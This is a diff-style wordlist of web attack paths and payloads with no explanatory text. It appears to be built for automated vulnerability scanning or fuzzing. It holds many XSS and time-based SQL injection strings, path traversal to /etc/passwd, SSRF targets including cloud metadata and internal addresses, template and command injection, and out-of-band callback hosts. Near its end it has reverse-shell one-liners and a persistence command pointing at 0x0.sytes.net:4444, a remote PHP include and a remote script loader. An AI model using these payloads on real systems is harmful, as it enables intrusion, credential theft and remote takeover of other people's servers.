+/wp-admin/admin.php?page=mmursp-list&view=edit&mmursp_id="><svg/onload=alert(document.domain)>
+/wp-admin/admin-ajax.php?meta_ids=1+AND+(SELECT+3066+FROM+(SELECT(SLEEP(6)))CEHy)&action=remove_post_meta_condition
+/wp-content/plugins/infographic-and-list-builder-ilist/assets/js/ilist_custom_admin.js
+/wp-content/plugins/documentor-lite/core/js/documentor.js
+/wp-admin/admin-ajax.php?action=get_monthly_timetable&month=1+AND+(SELECT+6881+FROM+(SELECT(SLEEP(6)))iEAn)
+/wp-admin/admin-ajax.php?action=ajax_get&route_name=get_doctor_details&clinic_id=%7B"id":"1"%7D&props_doctor_id=1,2)+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b
+/index.php?rest_route=/xs-donate-form/payment-redirect/3
+/wp-admin/options-general.php?page=updraftplus&updraft_interval"></script><script>confirm('document_domain')</script>
+/wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js
+/repo/migrate
+/wp-admin/admin.php?page=hfcm-list&'><script>alert(/document.domain/)</script>
+/wp-content/plugins/woc-order-alert/assets/admin/js/scripts.js
+/wp-content/plugins/stopbadbots/assets/js/stopbadbots.js
+/admin/view:modules/load_module:users/edit-user:2
+/wp-admin/admin.php?page=advanced-booking-calendar-show-seasons-calendars&setting=changeSaved&room=1111%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22
+/wp-admin/admin-ajax.php?action=vtprd_product_search_ajax&term=aaa%27+union+select+1,sleep(6),3--+-
+/index.php?activate=1
+/wp-admin/upload.php
+/wp-json/metform/v1/forms/templates/0
+/proxy?url=http%3a//0:8080/
+/wp-admin/admin.php?page=newsletter_main_index&debug&"><svg/onload=alert(/document.domain/)>
+/service/0/test.oast.me
+/api/search/attribute?versionid=*&tf_version=%27+and+(select%20pg_sleep(7))+ISNULL--
+/wp-admin/admin-ajax.php?action=dprv_log_event&message=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wp-admin/admin-ajax.php?action=get_sw_product&title=%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wp-admin/admin-ajax.php?action=easync_success_and_save
+/OA_CGI/FNDWRR.exe
+/backend/backend/auth/signin
+/wp-admin/admin.php?page=fw-extensions&sub-page=extension&extension=feedback<script>alert(document.domain)</script>
+/modules/appagebuilder/config.xml
+/vcac/
+/wbm/login/?next=https%3A%2F%2F7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/wp-content/plugins/vr-calendar-sync/assets/js/public.js
+/wp-admin/admin-post.php?vrc_cmd=phpinfo
+/wp-json/rps_result/v1/route/student_fields
+/wp-json/rps_result/v1/route/search_student?department_id=1&batch_id=1
+/?location=search
+/iupjournals/index.php/esj
+/Main/Default.aspx?viewSurveyError=Unknown+survey"><img%20src=x%20onerror=alert(document.domain)>
+/wp-admin/admin.php?page=ai1wm_export
+/wp-admin/admin.php?page=GOTMLS-settings&GOTMLS_debug=<%2Fscript><img+src+onerror%3Dalert%28document.domain%29>
+/..\..\..\..\..\..\..\..\..\..\windows\win.ini
+/elfinder/php/connector.minimal.php?cmd=file&target=l1_<@base64>/var/www/html/elfinder/files//..//..//..//..//..//../etc/passwd<@/base64>&download=1
+/interface/forms/fee_sheet/review/fee_sheet_options_ajax.php?pricelevel=%3Cimg%20src=a%20onerror=alert(document.cookie)%3E
+/admin/ajax/pages.php?id=(sleep(6))
+/navigate/login.php
+/navigate/private/1/cache/0f1726ba83325848d47e216b29d5ab99.feed
+/wp-admin/admin.php?page=WPvivid
+/obcs/user/dashboard.php
+/admin/dashboard.php
+/dfsms/add-category.php
+/ccms/dashboard.php
+","http":"http://7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com/","interval":"10s","timeout":"1s","disable_redirects":true}
+/nagiosxi/login.php?redirect=/www.7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/admin/users/index.php
+/dms/admin/?page=%27%3B%20alert(document.domain)%3B%20s%3D%27
+/dms/admin/?s=%27%3B%20alert(document.domain)%3B%20s%3D%27
+/wp-admin/?page=ee-simple-file-list&tab=settings&subtab="style=animation-name:rotation+onanimationstart=alert(document.domain)//
+/wp-admin/admin.php?page=nex-forms-dashboard&form_id=1+AND+(SELECT+42+FROM+(SELECT(SLEEP(7)))b)--
+/card_scan.php?No=123&ReaderNo=`sleep%207`&CardFormatNo=123
+/pfblockerng/www/index.php
+/live_check.shtml
+/admin/index.php?page=config
+/admin/?page=reports&date=2022-05-24-6'+AND+(SELECT+7774+FROM+(SELECT(SLEEP(0)))dPPt)+AND+'rogN'='rogN
+/admin/?page=reports&date=2022-05-24-6'+AND+(SELECT+7774+FROM+(SELECT(SLEEP(10)))dPPt)+AND+'rogN'='rogN
+/cgi/get_param.cgi?xml&sys.passwd&sys.su.name
+/?wmcAction=wmcTrack&url=test&uid=0&pid=0&visitorId=1331'+and+sleep(7)+or+'
+/sysinit.shtml?r=52300
+/set_safety.shtml?r=52300
+/cgi-bin/ExportLogs.sh
+/delsnap.pl?name=|id
+/wp-admin/options-general.php?page=rp4wp
+/wp-admin/options-general.php?page=rp4wp&settings-updated=true
+/picturesPreview?urls=aHR0cDovLzEyNy4wLjAuMS8xLnR4dCI%2BPHN2Zy9vbmxvYWQ9YWxlcnQoZG9jdW1lbnQuZG9tYWluKT4%3D
+/wnm/login/login.json
+/wp-admin/admin.php?page=pm_add_group&id="><script>alert%28document.domain%29<%2Fscript>
+/login.zul
+/rest/api/latest/repos
+/zimbraAdmin/0MVzAe6pgwe5go1D.jsp
+/wp-admin/edit.php?post_type=nft&page=nft-batch-mint&step=4&collection_id=1+AND+(SELECT+7741+FROM+(SELECT(SLEEP(7)))hlAf)&uid=1
+//%5cexample.com
+/wp-content/plugins/crm-perks-forms/readme.txt
+/wp-content/plugins/crm-perks-forms/templates/sample_file.php?FirstName=<img%20src%20onerror=alert(document.domain)>&LastName=<img%20src%20onerror=alert(document.domain)>&%20Company=<img%20src%20onerror=alert(document.domain)>
+/api/subscriber
+/navpage.do
+/assessment_redirect.do?sysparm_survey_url=javascript:alert(document.domain)//assessment_take2.do
+/wp-admin/admin.php?page=language-translate.php&success=added"><script>alert(`XSS`)<%2Fscript>
+/wp-admin/admin-ajax.php?action=ere_property_gallery_fillter_ajax&columns_gap=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C!--
+/wp-admin/admin.php?page=blocks_form&block_cat_ID=1%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
+/admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.domain%29%22autofocus%3d%22zr4da
+/kfm/index.php/'<script>alert(document.domain);</script>
+/wp-admin/admin-ajax.php?action=mcwp_table&mcwp_id=1&order[0][column]=0&columns[0][name]=name+AND+(SELECT+1+FROM+(SELECT(SLEEP(7)))aaaa)--+-
+/wp-content/plugins/cryptocurrency-widgets-pack/readme.txt
+/api/v2/cmdb/system/admin
+/goform/downloadSyslog/syslog.log
+/?q=user/login
+/?q=node/add/card
+/?q=node/add/page
+/?q=node/add/post
+/ajax.php?f=getPipelineJobOrder&joborderID=1)"></a>%20<script>alert(document.domain)</script>&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
+/ajax.php?f=getPipelineJobOrder&joborderID=2&page=0&entriesPerPage=15)"></a>%20<script>alert(document.domain)</script>&sortBy=dateCreatedInt&sortDirection=desc&indexFile=index.php&isPopup=0
+/index.php?m=toolbar&callback=<script>alert(document.domain)</script>&a=authenticate
+/ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert(document.domain)</script>&isPopup=0
+/index.php?m=toolbar&callback=abcd&a=checkEmailIsInSystem&email=</script><script>alert(document.domain)</script>
+/wp-admin/admin-ajax.php?action=loginas_return_admin
+/wp-admin/users.php
+/wp-content/plugins/panda-pods-repeater-field/fields/pandarepeaterfield.php?itemid=1&podid=1);%20alert(document.domain);/*x&iframe_id=panda-repeater-add-new&success=1
+/wp-admin/options-general.php?page=post-status-notifier-lite&controller=%3Cscript%3Ealert%28%60document.domain%60%29%3C%2Fscript%3E
+/approvals/deleteapprovalstages.php?id=1)+AND+(SELECT+3830+FROM+(SELECT(SLEEP(6)))MbGE)+AND+(6162=6162
+/administration/phasesets.php?mode=delete&id=1)+AND+(SELECT+3830+FROM+(SELECT(SLEEP(6)))MbGE)+AND+(6162=6162
+/index.php?module=dashboard/
+/clients/editclient.php?
+/admin/login/index.php
+/admin/users/
+/admin/settings/
+/search/index.php
+/wp-admin/post.php?post=1+AND+(SELECT+6205+FROM+(SELECT(SLEEP(6)))RtRs)&action=edit
+/admin/settings/index.php?advanced=yes
+/admin/?muraAction=cEditProfile.edit
+/wp-json/lp/v1/courses/archive-course?template_path=..%2F..%2F..%2Fetc%2Fpasswd&return_type=html
+/wp-admin/admin-ajax.php?action=pb_backupbuddy_backupbuddy&function=destination_picker&add=local&filter=local&callback_data=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E1
+/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=%3C/script%3E%3Csvg/onload=alert(document.domain)%3E
+/dashboard/retrieve-password/?reset_key=%22%3E%3Csvg%20onload=prompt(document.domain)%3E&user_id=dd
+/flash/addcrypted2
+/wp-admin/admin.php?page=vxcf_leads&form_id=cf_5&status&tab=entries&search&order=asc&orderby=file-438&field&time&start_date&end_date=onobw%22%3e%3cscript%3ealert(document.domain)%3c%2fscript%3ez2u4g
+/accounts/login/
+/dashboard/
+/wp-admin/admin.php?page=ap-pricing-tables-lite&message=1
+/wp-admin/admin.php?page=wc4jp-options&tab=a</script><svg/onload=alert(document.domain)>
+/wp-admin/admin.php?page=peachpay&tab=field&"><script>alert(document.domain)</script>
+/wp-admin/admin.php?page=watu_takings&exam_id=1&dn="%2Fonmouseover%3Dalert(document.domain)%2F%2F
+/wp-admin/options-general.php?page=gn-publisher-settings&tab=%22%2F+onmouseover%3Dalert%28document.domain%29%3B%2F%2F
+/wp-admin/admin.php?page=tnt_video_edit_page&videoID=SLEEP(7)
+/wp-admin/options-general.php?page=mycryptocheckout&tab=autosettlements&"><script>alert(/XSS/)</script>
+/wp-admin/tools.php?page=csg-sitemap&tabbed=%3Csvg%2Fonload%3Dalert(document.domain)%3E
+/wp-admin/admin.php?page=nf-processing&title=%253Csvg%252Fonload%253Dalert%2528document.domain%2529%253E
+/wp-admin/edit.php?post_type=tablesome_cpt&a%22%3e%3cscript%3ealert`document.domain`%3c%2fscript%3e
+/index.html
+/wp-admin/admin.php?page=prettyurls
+/csrf
+/wp-admin/admin.php?page=iowd_settings&msg=1&iowd_tabs_active=generalry8uo%22%3E%3Cimg%20src%3da%20onerror%3dalert(document.domain)%3Ef0cmo
+/wp-admin/admin.php?page=wdseo_sitemap
+/setup/setupadministrator-start.action
+/welcome.action
+/wp-admin/edit.php?post_type=at_biz_dir&page=tools&step=2&file=%2Fetc%2Fpasswd&delimiter=%3B
+/?rest_route=/pmpro/v1/order&code=a%27%20OR%20(SELECT%201%20FROM%20(SELECT(SLEEP(7)))a)--%20-
+/wp-content/plugins/paid-memberships-pro/js/updates.js
+/wp-admin/admin-ajax.php?action=edd_download_search&s=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(6)))a)--+-
+/wp-content/plugins/easy-digital-downloads/readme.txt
+/app/tools/subnet-masks/popup.php?closeClass=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/pmb/admin/convert/export_z3950.php?command=search&query=%3Cscript%3Ealert(document.domain);%3C/script%3E=or
+/geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities
+/v2/person/not-found?id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/hax/..CFIDE/adminapi/administrator.cfc?method=getBuildNumber&_cfclient=true
+/modules/jmsblog/config.xml
+["filename"];
+/index.php?m=settings&a=previewPage&url=https://oast.me
+/wp-json/wp/v2/add-listing?id=1
+/app?service=page/SetupCompleted
+/app?service=page/PrinterList
+/spip.php?page=spip_pass
+/api/hassio/app/.%252e/supervisor/info
+/api/hassio/app/.%09./supervisor/info#Mitigationbypass1
+/api/hassio_ingress/.%09./supervisor/info#Mitigationbypass2
+/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[%3Cimg%20src%3Dx%20onerror%3Dalert%28document%2Edomain%29%3E]=https://7fnerkk4ejqsa0874rxlxrtc73du1lpa.oastify.com
+/wp-admin/admin.php?page=newsletter_system_status&a%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/users/sign_in
+/wp-content/plugins/gift-voucher/readme.txt
+/wp-admin/admin-ajax.php?action=techno_get_products&page=<svg%20onload=alert(document.domain)>
+/home.do
+/_api/web/siteusers
+/wp-admin/post-new.php?post_type=foogallery&post=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/modules/leocustomajax/leoajax.php?cat_list=(SELECT(0)FROM(SELECT(SLEEP(6)))a)
+/clog.php
+/wp-admin/edit.php?post_type=acf-post-type&post_status=%22style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29%2F%2F
+/wp-admin/edit.php?page=cms-tpv-page-post&post_type=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/lib/editor/tiny/loader.php?rev=a/../../../../html/pix/f/<input><img%20src=x%20onerror=alert(document.domain)>.png
+/login/index.php
+/admin/tool/filetypes/edit.php?name=add
+/wp-json/wp/v2/users/
+/?rest_route=/wp/v2/users
+/feed/
+/author-sitemap.xml
+/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
+/admin/manage_task.php?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+
+/wp-admin/profile.php
+/wp-json/masteriyo/v1/users/
+/enrollment/index.php?page=home
+/ws/msw/tenant/%27%20union%20select%20%28select%20ID%20from%20SGMSDB.DOMAINS%20limit%201%29%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%28select%20concat%28id%2C%20%27%3A%27%2C%20password%29%20from%20sgmsdb.users%20where%20active%20%3D%20%271%27%20order%20by%20issuperadmin%20desc%20limit%201%20offset%200%29%2C%27%27%2C%20%27%27%2C%20%27
+/appliance/login
+/h/autoSaveDraft?draftid=aaaaaaaaaaa%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cbbbbbbbb
+/index.php?q=/modules/Staff/staff_view_details.php&gibbonTTID=00000010&gibbonPersonID=0000000001&search=yyraq'><script>alert(document.domain)</script>oq7c8fmwwro&ttDate=05/23/2023&schoolCalendar=N&personalCalendar=N&spaceBookingCalendar=N&fromTT=Y
+/wp-content/plugins/ultimate-member/readme.txt
+/file-manager/
+/admin.php?page=user_activity
+/m/momoveto?st="><img%20src=x%20onerror=alert(document.domain)>
+/api/server/version
+/b_download/index.html
+/api/session/properties
+/system_certmanager.php?act=%22%3E%3Csvg/onload=alert(document.domain)%3E&id=0
+/lib/crud/configcompare.crud.php?path_b=file:///etc/passwd
+/lib/crud/configcompare.crud.php?path_a=file:///etc/passwd
+/lib/ajaxHandlers/ajaxGetFileByPath.php?path=file://localhost/etc/passwd
+/wp-admin/admin.php?page=blog2social&origin=publish_post&deletePostStatus=success&deletedPostsNumber=1<img+src+onerror%3Dalert%28document.domain%29>
+/graph_view.php?action=tree_content&node=1-1-tree_anchor&rfilter=%22or+%22%22%3D%22%28%28%22%29%29%3BSELECT+SLEEP%2810%29%3B--+-
+/webmail/?color=%22%3E%3Cimg%20src=x%20onerror=confirm(document.cookie)%3E
+/resources/qmc/fonts/CVE-2023-41265.ttf
+/wp-admin/edit.php?post_type=ditty&page=ditty_export&tab=export_ditty&"><script>alert(/XSS/)</script>
+=T1bPulsantiera&EVENTARGUMENT=TlbPulsantiera_Item_0%3AUP&___VIEWSTATE='TESTING&LeftArea%3ALeftMenu_hidden=&T1bPulsantiera_CancelClick=false&TlbPulsantiera_hidden=&cbUtente=&txtDataRichiestaDa=&txtDataRichiestaA=&TopArea%3ATopMenu=
+/RealGimmWeb/Pages/ErroreNonGestito.aspx
+">
+/api/v1/totp/user-backup-code/../../system/system-information
+/api/v1/cav/client/status/../../admin/options
+/user/login/
+/api/current-user/whoami
+/wp-admin/post.php?post=1&action=elementor
+/oauth/idp/.well-known/openid-configuration
+/tutor/filter?searched_word=&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0
+/dview8/api/usersByLevel
+/backend/system/mailbrandsettings
+/signin
+/dashboard
+/workspace/create
+/3/ImportFiles?path=%2Fetc%2Fpasswd
+/wp-json/post-smtp/v1/get-log
+https://app.datadoghq.com/account/login
+/.dbeaver/credentials-config.json
+/plus/flink.php?dopost=save&c=cat%20/etc/passwd
+http://169.254.169.254/metadata/v1.json
+/api/v3/users
+/version
+/druid/submitLogin
+/Admin/Access/default.aspx
+/user.php?act=login
+/wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/php/connector.minimal.php?cmd=file&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk&download=1
+/videoseyret.php?id=95%20AND%20(SELECT%204581%20FROM%20(SELECT(SLEEP(6)))NyiX)
+/exciter.php
+/fpui/jsp/index.jsp
+/admin.php?p=static&action=write&page=%22onfocus%3d%22alert%28document.cookie%29%22autofocus%3d%22
+/api/v2/cmdb/system/admin/admin
+/api/proxy/tcp
+/fuel/login
+/api/presets/?filter=true
+/geoserver/web/
+/Visitor/bin/WebStrings.srf?file=&obj_name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/api/v1/repos/search?limit=1
+https://github.com/login
+/goanywhere/auth/Login.xhtml
+/default/en_US/status.html
+/blog-search?search=deneme%27%20AND%20(SELECT%201642%20FROM%20(SELECT(SLEEP(6)))Xppf)%20AND%20%27rszk%27=%27rszk
+/../../../../../../../../../etc/passwd
+/3/Typeahead/files?src=%2F&limit=10
+/api/system/deviceinfo
+/hue/accounts/login?next=/
+/include/config.properties
+|POST)https?:\/\/
+/N0t4xist*~1*/a.aspx
+/*~1*/a.aspx'
+/HTTP/1.0
+/sites/web_vhost_domain_list.php
+/jbpm-console/app/tasks.jsf
+/systemController/showOrDownByurl.do?down=&dbPath=../../../../../../etc/passwd
+/systemController/showOrDownByurl.do?down=&dbPath=../Windows/win.ini
+/servicedesk/customer/user/signup
+/secure/Signup!default.jspa
+/jmx-console/
+/index.php?option=com_booking&controller=customer&task=getUserData&id=123
+/?controller=AuthController&action=login
+/system/console
+/#/login
+/kylin/api/user/authentication
+/wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script>
+/?season=1&league_id=1season=1&league_id=1'+AND+(SELECT+1909+FROM+(SELECT(SLEEP(6)))ZiBf)--+qODp&match_day=1&team_id=1&match_day=1&team_id=1
+/feed/ShowImage.do;.js.jsp?type=&imgName=../../../../../../../../../../../../../../../etc/passwd
+/index.php?page=home
+/magento_version
+/skin/frontend/default/default/css/styles.css
+/.magnolia/admincentral
+/.magnolia/admincentral/PUSH?v-uiId=1
+/control/userimage.html
+/wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(13337777)</script>
+/wp-content/plugins/music-store/ms-core/ms-submit.php
+/wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/nagios/side.php
+/WAN_wan.htm?.gif
+//netcore_get.cgi
+/wp-admin/index.php?a%22%3E%3Cscript%3Ealert(13337777)%3C/script%3E
+/_404_%3E%3Cscript%3Ealert(1337)%3C%2Fscript%3E
+/status%3E%3Cscript%3Ealert(7331)%3C%2Fscript%3E
+/wp-json/
+/user/main
+['css']
+/page/exportImport/fileTransfer/poc.jsp
+https://test.s3.amazonaws.com
+http://192.168.0.1/
+https://192.168.0.1/
+http://192.168.0.1:22/
+http://192.168.1.1/
+https://192.168.1.1/
+http://192.168.1.1:22/
+http://192.168.2.1/
+https://192.168.2.1/
+http://192.168.2.1:22/
+http:/10.0.0.1/
+https://10.0.0.1/
+http://10.0.0.1:22/
+http:/172.16.0.1/
+https://172.16.0.1/
+http://172.16.0.1:22/
+http:/intranet/
+https://intranet/
+http://intranet:22/
+http:/mail/
+https://mail/
+http://mail:22/
+http:/ntp/
+https://ntp/
+http://ntp:22/
+http://somethingthatdoesnotexist/
+http://127.0.0.1/
+https://127.0.0.1/
+http://localhost/
+https://localhost/
+http://somethingelsethatdoesnotexist/
+http://127.0.0.1:21
+http://127.0.0.1:22
+http://127.0.0.1:25
+http://127.0.0.1:110
+http://127.0.0.1:587
+https://127.0.0.1:587
+/install/includes/configure.php
+/prweb/
+/wp-admin/plugins.php?%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E
+/wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E
+[
+/properties-list.php
+/properties-list.php?property-types=%27
+/properties-list.php?property-types=1&types=2&location=&prices=&bedroom=&code=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/pmb/opac_css/ajax.php?categ=storage&datetime=undefined&id=1%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(7)))SHde)&module=ajax&sub=save&token=undefined
+/podcast/PodcastGenerator/admin/episodes_upload.php
+https://identity.getpostman.com/login
+/testing-put.txt
+/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx
+/qvisdvr/
+/api/whoami
+/?/AdminAppData@no-mobile-0/0/15503332983847185/
+/v3/settings/first-login
+/AgentBoard.XGI?user='||'1&cmd=UserLogin
+/Board.XGI
+/EXCU_SHELL
+/svpn_html/loadfile.php?file=/etc/./passwd
+/wp-admin/admin.php?page=seatreg-welcome
+/yyoa/ext/trafaxserver/SystemManage/config.jsp
+/yyoa/assess/js/initDataAssess.jsp
+/seeyon/main.do
+/login.do
+/wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(13337777)</script>
+/apt/v1/context
+/HTTP/1337
+/SolarWinds/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS
+/InformationService/v3/Json/Query?query=SELECT+Uri+FROM+Orion.Pollers+ORDER+BY+PollerID+WITH+ROWS+1+TO+3+WITH+TOTALROWS
+/cgi-bin/jarrewrite.sh
+/en-US/account/login?return_to=%2Fen-US%2Faccount%2F
+/en-US/splunkd/__raw/services/server/health/splunkd?output_mode=json&_=
+/heapdump
+/actuator/heapdump
+/Reports/Pages/Folder.aspx
+/ReportServer/Pages/Folder.aspx
+/steve/manager/signin
+/guestLogin.html?guest=1
+/registerUser.html?init=1
+/?p=
+/manager/html
+/examples/jsp/security/protected/index.jsp
+basedform
+/general/index.php
+/general/
+')||contains(body_2,'POST')
+/general/login_code.php
+/general/index.php?isIE=0&modify_pwd=0
+/config_application.txt
+/Export_Log?/etc/passwd
+/account/register
+/configuration
+/versa/login.html
+/authenticate
+/super/login.html?lang=en
+/portal/info.jsp
+/websso/SAML2/SSO/vsphere.local?SAMLRequest=
+/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1';WAITFOR%20DELAY%20'0:0:7'--
+/webapi/file/transfer?name=/../../../../../../../../etc/passwd&type=db_backup
+wp-admin/admin.php?page=watu_question&question=1&action=edit&quiz=1"><svg/onload=alert(document.domain)>
+/app/login?nextUrl=%2Fapp%2Fwazuh
+/inc/jquery/uploadify/uploadify.php
+/general/weibo/javascript/LazyUploadify/uploadify.php
+/general/weibo/javascript/uploadify/uploadify.php
+/attachment/personal/_temp.php
+/console/
+/sysinfo.cgi
+/cgi-bin/gateway/agentinfo
+/management
+/wp-admin/admin.php?page=wpo_wcpdf_options_page&tab=documents&section=invoice&"><script>alert(document.domain)</script>
+/wp-json/oembed/1.0/proxy
+/mobile-app/v3/?pid='+AND+(SELECT+6398+FROM+(SELECT(SLEEP(7)))zoQK)+AND+'Zbtn'='Zbtn&isMobile=chatbot
+/wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(13337777)</script>
+/wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script>
+/wp-content/plugins/ellipsis-human-presence-technology/inc/protected-forms-table.php?&page=%22%20%3E%3Cscript%3Ealert(document.location)%3C/script%3E
+/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../wp-config.php
+/wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(13337777)</script>
+/wp-content/plugins/portrait-archiv-shop/js/imageDetails.php?pDetails=);});%3C/script%3E%3Cscript%3Ealert(document.location)%3C/script%3E
+/wp-content/plugins/qwiz-online-quizzes-and-flashcards/registration_complete.php?&qname=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/wp-admin/admin.php?page=rp4wp_link_related&rp4wp_parent=156x%27%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28document.domain%29%3E
+/wp-content/plugins/smart-manager-for-wp-e-commerce/readme.txt
+/wp-content/plugins/superstorefinder-wp/ssf-wp-admin/pages/exportAjax.php
+/wp-admin/admin.php?page=wptouch-admin-license&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/api/group/list
+/?BazaR&vue=consulter
+/admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0
+/ncupload/n2d19a.jsp
+/login.jsp
+/mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27127381%27))))--
+/admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22
+/plugins/webuploader/js/webconfig.php
+/plugins/template/login.php?backurl=1%20onmouseover%3dalert(/document.domain/)%20y%3d
+AliElTop
+gh1tpn7ip68xi45lg48197t9107rvhj6.oastify.com
+â€œ><script>alert(document.domain)</script>
+<Svg Only=1 OnLoad=confirm(atob("QWxpRWxUb3A="))>
+")'<!--><Svg OnLoad=(confirm)(13337777)<!--
+">'-(k=alert,k(13337777))-'
+<form><button formaction=javascript&colon;alert(13337777)
+#"><img src=/ onerror=alert(13337777)>
+<style><style /><img src=x onerror=alert(13337777)>
+<img alt="<x" title="/><img src=x onerror=alert(13337777)>">
+javascript://%0aalert(13337777)
+<script\x20type="text/javascript">javascript:alert(13337777);</script>
+<script\x3Etype="text/javascript">javascript:alert(13337777);</script>
+<script\x0Dtype="text/javascript">javascript:alert(13337777);</script>
+<script\x09type="text/javascript">javascript:alert(13337777);</script>
+<script\x0Ctype="text/javascript">javascript:alert(13337777);</script>
+<script\x2Ftype="text/javascript">javascript:alert(13337777);</script>
+<script\x0Atype="text/javascript">javascript:alert(13337777);</script>
+'`"><\x3Cscript>javascript:alert(13337777)</script>        
+'`"><\x00script>javascript:alert(13337777)</script>
+<img src=1 href=1 onerror="javascript:alert(13337777)"></img>
+<audio src=1 href=1 onerror="javascript:alert(13337777)"></audio>
+<video src=1 href=1 onerror="javascript:alert(13337777)"></video>
+<body src=1 href=1 onerror="javascript:alert(13337777)"></body>
+<image src=1 href=1 onerror="javascript:alert(13337777)"></image>
+<object src=1 href=1 onerror="javascript:alert(13337777)"></object>
+<script src=1 href=1 onerror="javascript:alert(13337777)"></script>
+<svg xmlns="http://0x0.sytes.net/ali1.svg" onload="alert(13337777)"/>
+-1" OR 2+199-199-1=0+0+0+1 --
+if(now()=sysdate(),sleep(20),0)
+0"XOR(if(now()=sysdate(),sleep(20),0))XOR\
+${@print(md5(31337))}
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+'(select*from(select(sleep(20)))a)'
+_next/image?url=
+'%2beval(compile('for%20x%20in%20range(1)%3a%5cn%20import%20time%5cn%20time.sleep(20)'%2c'a'%2c'single'))%2b'
+%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23'%20%7cping%20-n%2021%20127.0.0.1%7c%7c%60ping%20-c%2021%20127.0.0.1%60%20%23%5c%22%20%7cping%20-n%2021%20127.0.0.1
+../../../../../../../../../../../../../../etc/passwd
+" + response.write(9776594*9852164) + \
+sh -i 5<> /dev/tcp/0x0.sytes.net/4444 0<&5 1>&5 2>&5
+run persistence -U -i 5 -p 4444 -r 0x0.sytes.net
+nc 0x0.sytes.net 4444 -e /bin/sh
+onmouseover=alert('AliElTop')
+0x0.sytes.net:4444
+http://0x0.sytes.net:4444
+confirm('AliElTop')
+http://0x0.sytes.net/ali1.svg
+{{['id']|filter('system')}}
+javascript:alert(1)
+;@include('http://0x0.sytes.net/ali1.svg')
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/8dis0rxh46\';document.body.appendChild(a)')
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.cookie)">AliElTop
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.location)">AliElTop
+"><a/href="javascrip&#116&#000000000000000000000000000000000000000000000058a:confirm(document.domain)">AliElTop
+<a href="javascript:alert('AliElTop')">AliElTop</a>
